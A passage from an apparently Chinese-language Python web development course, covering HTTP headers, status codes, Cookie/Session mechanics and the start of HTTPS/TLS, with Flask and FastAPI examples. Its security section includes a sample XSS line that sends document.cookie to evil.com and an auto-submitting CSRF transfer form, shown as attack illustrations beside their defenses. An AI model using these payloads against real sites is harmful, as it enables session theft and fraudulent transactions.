WWW-Authenticate: Basic realm="Restricted Area"
\`\`\`

### 4.9 Refresh - 自动刷新/跳转

非标准但广泛支持：
\`\`\`
Refresh: 5; url=https://example.com  # 5秒后跳转
\`\`\`

### 4.10 X-Content-Type-Options - 安全头部

\`\`\`
X-Content-Type-Options: nosniff
\`\`\`

禁止浏览器MIME类型嗅探，防止XSS。

其他安全头部：
\`\`\`
X-Frame-Options: DENY                    # 禁止被iframe嵌入
X-XSS-Protection: 1; mode=block          # 开启XSS过滤
Strict-Transport-Security: max-age=31536000; includeSubDomains  # HSTS强制HTTPS
Content-Security-Policy: default-src 'self'  # CSP内容安全策略
Referrer-Policy: strict-origin-when-cross-origin  # Referrer策略
\`\`\`

Flask中可以用Flask-Talisman设置安全头部：
\`\`\`python
from flask_talisman import Talisman

Talisman(app)  # 自动设置安全头部
\`\`\`

---

## 五、Python中操作头部

### 5.1 Flask读写头部

\`\`\`python
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route("/api/demo")
def demo():
    # 读取请求头
    auth = request.headers.get("Authorization")
    ua = request.headers.get("User-Agent")
    real_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    # 设置响应头
    resp = make_response({"message": "OK"})
    resp.headers["X-Custom-Header"] = "value"
    resp.headers["Cache-Control"] = "no-cache"
    resp.headers["X-Request-ID"] = "abc123"
    return resp
\`\`\`

### 5.2 requests发送自定义头部

\`\`\`python
import requests
import uuid

headers = {
    "Authorization": "Bearer token123",
    "Content-Type": "application/json",
    "User-Agent": "MyApp/1.0",
    "X-Request-ID": str(uuid.uuid4()),
    "Accept-Language": "zh-CN,zh;q=0.9"
}

resp = requests.get("https://api.example.com/data", headers=headers)
print(resp.headers)  # 查看响应头
\`\`\`

---

## 六、常见面试题

### Cookie和Authorization头的区别？

Cookie是浏览器自动携带的，用于Session认证；Authorization头需要手动设置，常用于JWT/Token认证。Cookie有跨站限制，Authorization没有。

### Content-Type常见有哪些？什么时候用？

- application/json：AJAX/API最常用
- application/x-www-form-urlencoded：传统表单提交
- multipart/form-data：文件上传
- text/html：HTML页面

### 什么是CORS？有哪些相关头部？

跨域资源共享，是浏览器的同源策略限制。相关头部有Origin（请求来源）、Access-Control-Allow-Origin（允许的源）、Access-Control-Allow-Methods/Headers等。非简单请求会先发OPTIONS预检。

### 如何防止图片被盗链？

检查Referer头，如果不是本站来源则返回403或替换图片。注意Referer可能被伪造，重要资源用签名URL。

---

## 七、本章小结

- HTTP头部分通用、请求、响应、实体四类
- 常用请求头：Host、User-Agent、Accept、Content-Type、Cookie、Authorization、Referer
- 常用响应头：Content-Type、Set-Cookie、Location、Access-Control-Allow-Origin
- Content-Type决定消息体格式，API常用application/json
- Authorization用于JWT/Basic认证
- 安全头部（CSP、HSTS、X-Frame-Options）防止常见攻击
- 自定义头部通常用X-前缀
`
  },
  {
    id: "pyb-2-4",
    group: "HTTP协议深度解析",
    icon: "📡",
    title: "HTTP状态码大全",
    content: `

# HTTP状态码大全

状态码是响应的第一行，用3位数字表示请求的处理结果。

## 一、状态码分类

| 区间 | 类别 | 含义 |
|------|------|------|
| 1xx | 信息响应 | 请求已接收，继续处理 |
| 2xx | 成功响应 | 请求已成功处理 |
| 3xx | 重定向 | 需要进一步操作完成请求 |
| 4xx | 客户端错误 | 请求有错误 |
| 5xx | 服务器错误 | 服务器处理请求出错 |

---

## 二、1xx 信息性状态码

1xx表示临时响应，HTTP/1.0不支持。

| 状态码 | 原因短语 | 说明 |
|--------|---------|------|
| 100 | Continue | 已收到请求头，客户端应继续发送请求体 |
| 101 | Switching Protocols | 服务器同意切换协议（如WebSocket） |
| 102 | Processing | 服务器正在处理，还没有响应（WebDAV） |
| 103 | Early Hints | 预加载资源提示（HTTP/2） |

**100 Continue使用场景**：客户端要发送大文件，先发请求头Expect: 100-continue，服务器返回100 Continue后再发请求体，避免发了大文件才发现认证失败。

---

## 三、2xx 成功状态码

| 状态码 | 原因短语 | 说明 | 使用场景 |
|--------|---------|------|---------|
| 200 | OK | 请求成功 | GET成功、PUT/PATCH成功 |
| 201 | Created | 资源创建成功 | POST创建成功 |
| 202 | Accepted | 请求已接受，未处理完成 | 异步任务（如导出Excel） |
| 204 | No Content | 成功但无响应体 | DELETE成功 |
| 206 | Partial Content | 部分内容 | 断点续传、Range请求 |

### 200 OK

最常见的成功状态码，GET/PUT/PATCH成功一般返回200。

\`\`\`python
from flask import Flask, jsonify

app = Flask(__name__)

@app.route("/api/users/<int:user_id>")
def get_user(user_id):
    user = {"id": user_id, "name": "Tom"}
    return jsonify(user), 200  # 可以省略200，默认就是200
\`\`\`

### 201 Created

POST创建资源成功时返回，最好在Location头中返回新资源URL。

\`\`\`python
from flask import Flask, request, jsonify, url_for

app = Flask(__name__)

@app.route("/api/users", methods=["POST"])
def create_user():
    data = request.get_json()
    user = create_user_in_db(data)
    response = jsonify(user)
    response.status_code = 201
    response.headers["Location"] = url_for("get_user", user_id=user["id"])
    return response
\`\`\`

### 202 Accepted

异步处理场景，任务已接收但未完成：
\`\`\`python
import uuid
from celery import Celery

app = Flask(__name__)
celery = Celery(app.name)

@app.route("/api/export", methods=["POST"])
def export_data():
    task_id = str(uuid.uuid4())
    # 异步执行导出任务
    export_task.delay(task_id, request.json)
    return jsonify({
        "task_id": task_id,
        "message": "导出任务已提交"
    }), 202

@app.route("/api/tasks/<task_id>")
def get_task_status(task_id):
    task = get_task_result(task_id)
    return jsonify({"task_id": task_id, "status": task.status})
\`\`\`

### 204 No Content

DELETE成功或更新成功不需要返回数据时用：
\`\`\`python
@app.route("/api/users/<int:user_id>", methods=["DELETE"])
def delete_user(user_id):
    delete_user_by_id(user_id)
    return "", 204  # 空响应体
\`\`\`

### 206 Partial Content

断点续传或分块下载：
\`\`\`
GET /video.mp4 HTTP/1.1
Range: bytes=0-1023999       # 请求前1MB

HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023999/41943040
Content-Length: 1024000
(视频前1MB数据)
\`\`\`

Flask支持Range请求：
\`\`\`python
from flask import send_file

@app.route("/videos/<filename>")
def stream_video(filename):
    return send_file(
        f"videos/{filename}",
        conditional=True  # 自动处理Range请求
    )
\`\`\`

---

## 四、3xx 重定向状态码

| 状态码 | 原因短语 | 说明 | 缓存 | 方法变化 |
|--------|---------|------|------|---------|
| 301 | Moved Permanently | 永久重定向 | 浏览器缓存 | POST可能变GET |
| 302 | Found | 临时重定向 | 不缓存 | POST可能变GET |
| 303 | See Other | 用GET重定向到新URL | 不缓存 | POST变GET |
| 304 | Not Modified | 缓存未修改 | - | - |
| 307 | Temporary Redirect | 临时重定向，方法不变 | 不缓存 | 方法不变 |
| 308 | Permanent Redirect | 永久重定向，方法不变 | 缓存 | 方法不变 |

### 301 vs 302

- **301**：永久重定向，SEO权重转移到新地址，浏览器会缓存
- **302**：临时重定向，下次还请求原地址

\`\`\`python
from flask import Flask, redirect, url_for

app = Flask(__name__)

# 301永久重定向（网站改版、HTTP→HTTPS）
@app.route("/old-page")
def old_page():
    return redirect("/new-page", code=301)

# 302临时重定向（默认）
@app.route("/login-redirect")
def login_redirect():
    return redirect(url_for("login"))

# HTTP强制跳转HTTPS
@app.before_request
def force_https():
    if not request.is_secure and app.env == "production":
        url = request.url.replace("http://", "https://", 1)
        return redirect(url, code=301)
\`\`\`

### 303 See Other

POST请求后重定向到GET页面（PRG模式防止表单重复提交）：
\`\`\`python
@app.route("/submit", methods=["POST"])
def submit():
    # 处理表单...
    # 处理完重定向到结果页（浏览器刷新不会重复提交表单）
    return redirect(url_for("result"), code=303)
\`\`\`

### 304 Not Modified

缓存相关，资源未修改，浏览器使用本地缓存（详见缓存章节）。

### 307/308 vs 302/301

302/301大多数浏览器会把POST重定向改为GET，307/308保持原方法不变。

---

## 五、4xx 客户端错误

| 状态码 | 原因短语 | 说明 |
|--------|---------|------|
| 400 | Bad Request | 请求参数错误 |
| 401 | Unauthorized | 未认证（未登录） |
| 403 | Forbidden | 已认证但无权限 |
| 404 | Not Found | 资源不存在 |
| 405 | Method Not Allowed | 方法不允许（如只接受POST但发了GET） |
| 406 | Not Acceptable | 无法返回Accept要求的格式 |
| 408 | Request Timeout | 请求超时 |
| 409 | Conflict | 资源冲突（如用户名重复） |
| 410 | Gone | 资源已永久删除 |
| 413 | Payload Too Large | 请求体太大 |
| 415 | Unsupported Media Type | Content-Type不支持 |
| 422 | Unprocessable Entity | 验证失败（格式正确但语义错误） |
| 429 | Too Many Requests | 请求过多（限流） |

### 400 Bad Request

请求参数格式错误、缺少必填参数：
\`\`\`python
@app.route("/api/users", methods=["POST"])
def create_user():
    data = request.get_json()
    if not data or "name" not in data:
        return jsonify({"error": "缺少name参数", "code": 40001}), 400
    if len(data["name"]) < 2:
        return jsonify({"error": "用户名至少2个字符", "code": 40002}), 400
    # 创建...
\`\`\`

### 401 Unauthorized

未认证，需要登录。注意名称有误导性：Unauthorized是未认证，不是未授权。

\`\`\`python
from functools import wraps

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization")
        if not token:
            return jsonify({"error": "请先登录"}), 401
        user = verify_token(token.replace("Bearer ", ""))
        if not user:
            return jsonify({"error": "登录已过期"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route("/api/me")
@login_required
def me():
    return jsonify(get_current_user())
\`\`\`

### 403 Forbidden

已登录但没有权限访问：
\`\`\`python
def admin_required(f):
    @wraps(f)
    @login_required
    def decorated(*args, **kwargs):
        user = get_current_user()
        if not user.is_admin:
            return jsonify({"error": "需要管理员权限"}), 403
        return f(*args, **kwargs)
    return decorated
\`\`\`

**401 vs 403**：
- 401：你是谁？我不认识你（未登录）
- 403：我认识你，但你不能这么做（没权限）

### 404 Not Found

资源不存在。不要返回200+错误信息，正确返回404。

### 405 Method Not Allowed

请求方法不对，比如只接受POST的接口用GET访问：
\`\`\`
HTTP/1.1 405 Method Not Allowed
Allow: POST, OPTIONS
\`\`\`

### 409 Conflict

资源冲突，如注册时用户名已存在：
\`\`\`python
@app.route("/api/register", methods=["POST"])
def register():
    data = request.get_json()
    if User.query.filter_by(username=data["username"]).first():
        return jsonify({"error": "用户名已存在"}), 409
\`\`\`

### 422 Unprocessable Entity

参数格式正确但验证失败（WebDAV扩展，但API常用）。Flask-RESTful/FastAPI验证失败时常用。

\`\`\`python
# FastAPI自动返回422
from pydantic import BaseModel, EmailStr, ValidationError

class UserCreate(BaseModel):
    name: str
    age: int
    email: EmailStr

# 如果email格式不对，FastAPI自动返回422
# {
#   "detail": [{
#     "loc": ["body", "email"],
#     "msg": "value is not a valid email address",
#     "type": "value_error.email"
#   }]
# }
\`\`\`

### 429 Too Many Requests

限流时返回：
\`\`\`python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(get_remote_address, app=app)

@app.route("/api/sms/send")
@limiter.limit("1/minute")  # 每分钟1次
def send_sms():
    return jsonify({"message": "验证码已发送"})

# 429时响应头
# Retry-After: 60
# X-RateLimit-Limit: 1
# X-RateLimit-Remaining: 0
\`\`\`

---

## 六、5xx 服务器错误

| 状态码 | 原因短语 | 说明 |
|--------|---------|------|
| 500 | Internal Server Error | 服务器内部错误 |
| 501 | Not Implemented | 服务器不支持该功能 |
| 502 | Bad Gateway | 网关错误（反向代理收到无效响应） |
| 503 | Service Unavailable | 服务不可用（维护、过载） |
| 504 | Gateway Timeout | 网关超时 |

### 500 Internal Server Error

服务器代码出错、异常未捕获：
\`\`\`python
@app.errorhandler(500)
def internal_error(error):
    db.session.rollback()  # 回滚数据库事务
    logger.exception("服务器错误")  # 记录完整堆栈
    return jsonify({"error": "服务器内部错误", "code": 50000}), 500

@app.errorhandler(Exception)
def handle_exception(e):
    logger.exception("未捕获异常")
    return jsonify({"error": str(e)}), 500
\`\`\`

**生产环境不要暴露详细错误信息**！

### 502 Bad Gateway

Nginx作为反向代理，后端服务挂了或没启动时返回502。

常见原因：
- Gunicorn/uWSGI没启动
- 后端服务崩溃
- 后端启动超时

### 503 Service Unavailable

服务器维护或过载时返回，可以带Retry-After头：
\`\`\`
HTTP/1.1 503 Service Unavailable
Retry-After: 3600  # 1小时后重试
\`\`\`

### 504 Gateway Timeout

Nginx等代理服务器等待后端响应超时。常见原因：
- 后端接口处理太慢
- 数据库查询慢
- 后端死锁

Nginx超时配置：
\`\`\`nginx
proxy_read_timeout 60s;
proxy_connect_timeout 10s;
\`\`\`

---

## 七、常见状态码记忆口诀

\`\`\`
200 成功  201 创建  204 删除
301 永久  302 临时  304 缓存
400 参数错 401 未登录 403 无权限 404 不存在
405 方法错 429 请求多
500 服务器炸了 502 后端挂了 504 超时
\`\`\`

---

## 八、错误处理最佳实践

\`\`\`python
from flask import Flask, jsonify
import logging

app = Flask(__name__)

class AppError(Exception):
    """自定义业务异常基类"""
    code = 400
    error_code = 40000
    message = "错误"
    
    def __init__(self, message=None, code=None, error_code=None):
        if message:
            self.message = message
        if code:
            self.code = code
        if error_code:
            self.error_code = error_code

class NotFoundError(AppError):
    code = 404
    error_code = 40400
    message = "资源不存在"

class UnauthorizedError(AppError):
    code = 401
    error_code = 40100
    message = "请先登录"

class ForbiddenError(AppError):
    code = 403
    error_code = 40300
    message = "无权限"

class ValidationError(AppError):
    code = 400
    error_code = 40001
    message = "参数验证失败"

@app.errorhandler(AppError)
def handle_app_error(e):
    return jsonify({
        "code": e.error_code,
        "message": e.message,
        "data": None
    }), e.code

@app.errorhandler(404)
def not_found(e):
    return jsonify({"code": 404, "message": "接口不存在", "data": None}), 404

@app.errorhandler(405)
def method_not_allowed(e):
    return jsonify({"code": 405, "message": "方法不允许", "data": None}), 405

@app.errorhandler(500)
def internal_error(e):
    logging.exception("服务器错误")
    db.session.rollback()
    return jsonify({"code": 500, "message": "服务器内部错误", "data": None}), 500

# 使用示例
@app.route("/api/users/<int:user_id>")
def get_user(user_id):
    user = User.query.get(user_id)
    if not user:
        raise NotFoundError("用户不存在")
    if not user.can_view(current_user):
        raise ForbiddenError()
    return jsonify(user.to_dict())
\`\`\`

---

## 九、常见面试题

### 401和403的区别？

401是未认证/未登录，服务器不知道你是谁；403是已认证但没有权限访问，服务器知道你是谁但不允许。

### 301和302的区别？

301是永久重定向，浏览器会缓存，SEO权重转移；302是临时重定向，浏览器不会缓存。需要注意POST请求重定向可能变成GET。

### 200和201、204分别什么时候用？

200是通用成功，GET/PUT/PATCH成功返回200；201是POST创建资源成功时返回；204是DELETE成功或不需要返回内容时用。

### 502、503、504分别是什么原因？

502是网关收到无效响应（后端服务挂了）；503是服务暂时不可用（维护/过载）；504是网关等待后端响应超时。

### 遇到500错误怎么排查？

1. 查看后端日志，找到错误堆栈
2. 检查最近的代码变更
3. 检查数据库连接、第三方服务是否正常
4. 看是否是资源问题（内存、磁盘、连接池满了）
5. 本地复现调试

---

## 十、本章小结

- 1xx信息、2xx成功、3xx重定向、4xx客户端错误、5xx服务器错误
- 常用2xx：200成功、201创建、204无内容
- 常用3xx：301永久重定向、302临时重定向、304缓存未修改
- 常用4xx：400参数错、401未登录、403无权限、404不存在、429限流
- 常用5xx：500内部错误、502后端挂、504超时
- 自定义异常类统一错误处理
- 生产环境不暴露详细错误信息
`
  },
  {
    id: "pyb-2-5",
    group: "HTTP协议深度解析",
    icon: "📡",
    title: "Cookie与Session机制",
    content: `

# Cookie与Session机制

HTTP是无状态协议，每个请求独立。为了"记住用户"，需要Cookie和Session机制。

## 一、Cookie基础

### 1.1 Cookie是什么

Cookie是服务器通过Set-Cookie头设置在浏览器的小段数据（最大约4KB），浏览器之后每次请求同域名都会自动通过Cookie头带回来。

\`\`\`
# 服务器响应设置Cookie
HTTP/1.1 200 OK
Set-Cookie: username=tom; Path=/; Max-Age=3600

# 浏览器后续请求自动带Cookie
GET /api/me HTTP/1.1
Cookie: username=tom; sessionid=abc123
\`\`\`

### 1.2 Cookie属性

| 属性 | 说明 | 默认值 |
|------|------|--------|
| Name=Value | Cookie名值对 | - |
| Domain | 生效域名 | 当前域名 |
| Path | 生效路径 | / |
| Expires/Max-Age | 过期时间 | 会话Cookie（关闭浏览器失效） |
| HttpOnly | 禁止JS访问 | false |
| Secure | 仅HTTPS传输 | false |
| SameSite | 跨站限制 | Lax（Chrome 80+） |

\`\`\`python
from flask import Flask, make_response

app = Flask(__name__)

@app.route("/set-cookie")
def set_cookie():
    resp = make_response("Cookie已设置")
    # 设置Cookie
    resp.set_cookie(
        "username", "tom",
        max_age=3600,           # 存活1小时
        expires=None,           # 绝对过期时间
        path="/",               # 整个站点
        domain=".example.com",  # 所有子域名
        secure=True,            # 仅HTTPS
        httponly=True,          # JS无法读取
        samesite="Lax"          # 跨站限制
    )
    return resp

@app.route("/get-cookie")
def get_cookie():
    username = request.cookies.get("username")
    return f"Hello, {username}!"

@app.route("/delete-cookie")
def delete_cookie():
    resp = make_response("Cookie已删除")
    resp.delete_cookie("username")
    return resp
\`\`\`

### 1.3 Cookie属性详解

**Domain和Path**：
- Domain=.example.com：a.example.com和b.example.com都能访问
- Domain=www.example.com：只有www子域名能访问
- Path=/admin：只有/admin路径下能访问

**Expires和Max-Age**：
- Expires：绝对过期时间（GMT格式）
- Max-Age：存活秒数（优先级高于Expires）
- 都不设置：关闭浏览器就删除（会话Cookie）

**HttpOnly**：
- 设置后JavaScript无法通过document.cookie读取
- 防止XSS攻击窃取Cookie（关键！）
- Session ID必须设置HttpOnly

**Secure**：
- 只在HTTPS连接时才传输Cookie
- 防止HTTP明文传输被窃听

**SameSite**（重点，防止CSRF）：
- **Strict**：完全禁止第三方Cookie，跨站时任何请求都不发送
- **Lax**（默认）：允许顶级导航的GET请求带Cookie，POST/iframe/img等不允许
- **None**：允许跨站，但必须同时设置Secure

| 请求类型 | Strict | Lax | None |
|---------|--------|-----|------|
| 链接跳转 | 不发送 | 发送 | 发送 |
| GET表单提交 | 不发送 | 发送 | 发送 |
| POST表单提交 | 不发送 | 不发送 | 发送 |
| iframe | 不发送 | 不发送 | 发送 |
| AJAX | 不发送 | 不发送 | 发送 |
| img/script | 不发送 | 不发送 | 发送 |

---

## 二、Cookie的局限性

1. **大小限制**：每个Cookie约4KB，每个域名约50个Cookie
2. **安全风险**：明文传输（未设置Secure时）、XSS窃取、CSRF攻击
3. **每次请求都带**：增加流量开销，不适合存大量数据
4. **用户可禁用**：用户可能在浏览器中禁用Cookie
5. **跨域受限**：同源策略限制

---

## 三、Session机制

### 3.1 为什么需要Session

Cookie不安全，不能直接在Cookie中存敏感信息（如用户ID、权限）。Session将数据存在服务器，Cookie中只存一个Session ID。

\`\`\`
1. 用户登录成功，服务器创建Session对象，生成唯一session_id
2. 通过Set-Cookie返回sessionid=xxx给浏览器
3. 浏览器后续请求自动带Cookie: sessionid=xxx
4. 服务器根据session_id找到对应的Session对象，获取用户信息
\`\`\`

### 3.2 Flask使用Session

\`\`\`python
from flask import Flask, session, redirect, url_for, request

app = Flask(__name__)
app.secret_key = "super-secret-key-change-in-production"  # 必须设置！

@app.route("/login", methods=["POST"])
def login():
    data = request.form
    user = verify_user(data["username"], data["password"])
    if user:
        # 登录成功，设置Session
        session["user_id"] = user.id
        session["username"] = user.username
        session.permanent = True  # 使用PERMANENT_SESSION_LIFETIME
        return redirect(url_for("profile"))
    return "用户名或密码错误", 401

@app.route("/profile")
def profile():
    if "user_id" not in session:
        return redirect(url_for("login"))
    return f"欢迎你，{session['username']}!"

@app.route("/logout")
def logout():
    # 清除Session
    session.clear()
    return redirect(url_for("login"))

# Session配置
app.config["PERMANENT_SESSION_LIFETIME"] = 3600 * 24 * 7  # 7天
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SECURE"] = True  # 生产环境开启
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
\`\`\`

**注意**：Flask默认Session是客户端Session（数据加密后存在Cookie中），不是服务器端存储。生产环境建议用服务器端Session。

### 3.3 服务器端Session（Redis存储）

\`\`\`python
# pip install flask-session redis
from flask import Flask, session
from flask_session import Session
import redis

app = Flask(__name__)
app.secret_key = "secret-key"

# 使用Redis存储Session
app.config["SESSION_TYPE"] = "redis"
app.config["SESSION_REDIS"] = redis.Redis(host="localhost", port=6379, db=0)
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_USE_SIGNER"] = True
Session(app)

# 使用方式和之前一样
@app.route("/login", methods=["POST"])
def login():
    session["user_id"] = 1
    return "登录成功"
\`\`\`

Django默认Session存储在数据库，可以切换到Redis/Cache。

### 3.4 FastAPI使用Session

\`\`\`python
from fastapi import FastAPI, Request, Response, Depends, HTTPException
from starlette.middleware.sessions import SessionMiddleware
import secrets

app = FastAPI()
app.add_middleware(SessionMiddleware, secret_key="secret-key")

@app.post("/login")
async def login(request: Request, response: Response):
    request.session["user_id"] = 1
    request.session["username"] = "tom"
    return {"message": "登录成功"}

@app.get("/me")
async def me(request: Request):
    user_id = request.session.get("user_id")
    if not user_id:
        raise HTTPException(401, "未登录")
    return {"user_id": user_id}

@app.post("/logout")
async def logout(request: Request):
    request.session.clear()
    return {"message": "已退出"}
\`\`\`

---

## 四、分布式Session方案

单机Session存在服务器内存中，如果有多台应用服务器（集群/分布式），Session无法共享。

### 4.1 Session复制

早期方案，服务器之间同步Session，缺点是延迟和内存占用，不推荐。

### 4.2 Session粘滞（Sticky Session）

Nginx配置ip_hash，同一个用户的请求总是打到同一台服务器：

\`\`\`nginx
upstream backend {
    ip_hash;  # 基于IP哈希
    server 192.168.1.1:8000;
    server 192.168.1.2:8000;
}
\`\`\`

缺点：服务器重启Session丢失，负载不均衡。

### 4.3 集中式Session存储（推荐）

把Session存在Redis等共享存储中，所有应用服务器都访问同一个Redis：

\`\`\`
用户 → Nginx → App1 ──┐
         → App2 ──┼→ Redis Session
         → App3 ──┘
\`\`\`

优点：
- 可靠：Redis持久化，服务器重启不丢失
- 高性能：Redis读写快
- 易扩展：加服务器不影响Session

Redis Session结构：
\`\`\`
Key: session:{session_id}
Value: {user_id: 1, username: "tom", ...}（JSON/Hash）
TTL: 3600（过期时间）
\`\`\`

### 4.4 JWT（无Session方案）

不存Session在服务器，所有信息加密存在Token中：

\`\`\`
1. 用户登录，服务器签发JWT Token
2. Token返回给前端，前端存在localStorage/cookie
3. 每次请求在Authorization头带Token
4. 服务器验证Token签名，不需要查Session存储
\`\`\`

JWT vs Session对比：

| 对比项 | Session | JWT |
|--------|---------|-----|
| 存储位置 | 服务器（Redis） | 客户端 |
| 扩展性 | 需要共享存储 | 天然分布式 |
| 注销 | 服务器直接删除 | 难（需黑名单） |
| 续签 | 方便 | 需要双Token |
| 安全性 | 较高（可立即失效） | Token泄露风险 |
| 大小 | Cookie只有ID | Token较大 |
| 适用场景 | Web站点 | API/微服务/移动端 |

---

## 五、Cookie/Session安全问题

### 5.1 XSS攻击窃取Cookie

XSS注入恶意JS可以读取Cookie：
\`\`\`javascript
// 恶意代码
fetch("https://evil.com/steal?cookie=" + document.cookie);
\`\`\`

**防御**：
1. Cookie设置HttpOnly（关键！JS读不到）
2. 对用户输入做转义，防止XSS
3. Content-Security-Policy

### 5.2 CSRF跨站请求伪造

第三方网站诱导用户访问，利用浏览器自动带Cookie的特性发起请求：

\`\`\`html
<!-- 恶意网站页面 -->
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="hacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
\`\`\`

**防御**：
1. SameSite=Strict/Lax（现代浏览器默认）
2. CSRF Token（Django默认开启）
3. 关键操作验证Referer/Origin
4. 关键操作二次验证（密码/短信）

### 5.3 Cookie劫持（网络嗅探）

HTTP明文传输，中间人可以窃取Cookie。

**防御**：全站HTTPS + Cookie设置Secure。

---

## 六、常见面试题

### Cookie和Session的区别？

- Cookie存在客户端浏览器，Session存在服务器
- Cookie不安全（可被查看/篡改），Session安全
- Session依赖Cookie（存session_id）
- Cookie有大小限制（4KB），Session无限制
- Session占服务器资源，Cookie占带宽

### Cookie的HttpOnly、Secure、SameSite属性分别有什么用？

HttpOnly禁止JS读取，防XSS；Secure只在HTTPS传输，防窃听；SameSite限制跨站发送，防CSRF。

### 分布式Session怎么解决？

集中式存储（Redis/Memcached）最常用，也可以用Session粘滞、Session复制，但不推荐。JWT是无Session方案。

### JWT和Session怎么选？

Web站点用Session+Redis更方便（可主动注销、续签方便）；微服务/API/多端用JWT更方便（天然分布式、不需要共享存储）。

### 什么是CSRF？如何防御？

跨站请求伪造，利用浏览器自动带Cookie特性，恶意网站冒用用户身份操作。防御：SameSite Cookie、CSRF Token、验证Referer。

---

## 七、本章小结

- Cookie存客户端，Session存服务器，Session靠Cookie传session_id
- 关键Cookie属性：HttpOnly、Secure、SameSite、Domain、Path
- HttpOnly防XSS，Secure防窃听，SameSite防CSRF
- 分布式Session用Redis集中存储最可靠
- JWT是无状态方案，适合API/微服务，但注销和续签麻烦
- Session和JWT各有优劣，根据场景选择
- 注意Cookie安全属性配置，防止常见攻击
`
  },
  {
    id: "pyb-2-6",
    group: "HTTP协议深度解析",
    icon: "📡",
    title: "HTTPS与TLS",
    content: `

# HTTPS与TLS

HTTPS = HTTP + TLS/SSL，在HTTP和TCP之间加了加密层，保证通信安全。

## 一、为什么需要HTTPS

HTTP是明文传输，存在三大风险：

1. **窃听风险**：中间人可以看到通信内容（密码、隐私数据）
2. **篡改风险**：中间人可以修改内容（如插入广告、跳转恶意网站）
3. **冒充风险**：可以冒充银行/电商网站（钓鱼网站）

HTTPS通过加密、完整性校验、身份认证解决这些问题。

---

## 二、加密基础

### 2.1 对称加密

加密和解密用**同一个密钥**：

\`\`\`
明文 → [密钥加密] → 密文 → [密钥解密] → 明文
\`\`\`

优点：速度快
缺点：密钥如何安全传输给对方是个问题

常见算法：AES、DES、3DES、ChaCha20

\`\`\`python
from cryptography.fernet import Fernet

# 对称加密示例
key = Fernet.generate_key()
cipher = Fernet(key)

# 加密
message = "Hello HTTPS".encode()
encrypted = cipher.encrypt(message)
print(f"密文: {encrypted}")

# 解密
decrypted = cipher.decrypt(encrypted)
print(f"明文: {decrypted.decode()}")
\`\`\`

### 2.2 非对称加密

有一对密钥：**公钥**和**私钥**。公钥加密只能私钥解密，私钥签名只能公钥验证。

\`\`\`
公钥加密 → 私钥解密（用于加密传输）
私钥签名 → 公钥验证（用于身份认证）
\`\`\`

优点：解决密钥分发问题
缺点：速度慢（比对称加密慢几百倍）

常见算法：RSA、ECC（椭圆曲线）

\`\`\`python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

# 生成密钥对
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 公钥加密
message = b"secret message"
ciphertext = public_key.encrypt(
    message,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# 私钥解密
plaintext = private_key.decrypt(
    ciphertext,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)
print(plaintext.decode())
\`\`\`

### 2.3 哈希（散列）

不可逆，任意长度输入生成固定长度输出，用于完整性校验：

\`\`\`
消息 → 哈希算法 → 固定长度摘要
\`\`\`

特点：
- 不可逆：无法从摘要反推原文
- 雪崩效应：原文改一点摘要完全不同
- 唯一性：不同原文极难产生相同摘要（碰撞）

常见算法：MD5（不安全）、SHA-1（不安全）、SHA-256、SHA-3

\`\`\`python
import hashlib

data = "Hello".encode()
print(hashlib.md5(data).hexdigest())     # 不推荐
print(hashlib.sha256(data).hexdigest()) # 推荐
\`\`\`

HTTPS实际结合三种加密：
- 非对称加密：传输对称密钥（RSA密钥交换）
- 对称加密：加密通信内容（AES）
- 哈希：完整性校验（SHA256）

---

## 三、TLS握手过程

TLS握手在TCP三次握手之后进行，协商出一个对称密钥后才传输HTTP数据。

### 3.1 TLS 1.2握手（RSA密钥交换）

\`\`\`
客户端                                           服务器
  |                                                |
  |-------- Client Hello ------------------------->|  支持的TLS版本、加密套件列表、随机数1
  |                                                |
  |<------- Server Hello -------------------------|  选定版本、加密套件、随机数2
  |<------- Certificate -------------------------|  服务器证书（含公钥）
  |<------- Server Hello Done ------------------->|
  |                                                |
  |-------- Pre-Master Secret ------------------->|  用服务器公钥加密预主密钥
  |-------- Change Cipher Spec ------------------>|  以后用协商的密钥通信
  |-------- Finished (加密) --------------------->|  握手完成验证
  |                                                |
  |<------- Change Cipher Spec ------------------|
  |<------- Finished (加密) ---------------------|
  |                                                |
  |======== 加密的HTTP数据通信 ===================>|
\`\`\`

**过程详解**：

1. **Client Hello**：客户端发送
   - 支持的TLS版本（1.2、1.3）
   - 支持的加密套件列表（如TLS_AES_128_GCM_SHA256）
   - 客户端随机数（Client Random）
   - 扩展（SNI、ALPN等）

2. **Server Hello**：服务器回应
   - 选定的TLS版本
   - 选定的加密套件
   - 服务器随机数（Server Random）

3. **Certificate**：服务器发送数字证书（包含公钥）

4. **Pre-Master Secret**：客户端生成预主密钥，用服务器公钥加密后发送

5. **生成会话密钥**：双方用Client Random + Server Random + Pre-Master Secret通过PRF生成相同的对称密钥

6. **Finished消息**：双方用密钥加密发送Finished消息，验证握手成功

之后所有HTTP数据都用对称密钥加密传输。

### 3.2 TLS 1.3握手（更快）

TLS 1.3简化了握手，从2-RTT降到1-RTT甚至0-RTT：

\`\`\`
客户端                                    服务器
  |                                         |
  |---- Client Hello + Key Share ---------->|  猜测密钥协商参数，直接发送密钥
  |                                         |
  |<--- Server Hello + Key Share + -------|   同时发送证书、Finished
  |     Certificate + Finished             |
  |                                         |
  |---- Finished -------------------------->|
  |                                         |
  |===== 加密应用数据 ======================>|  1-RTT
\`\`\`

TLS 1.3相比1.2：
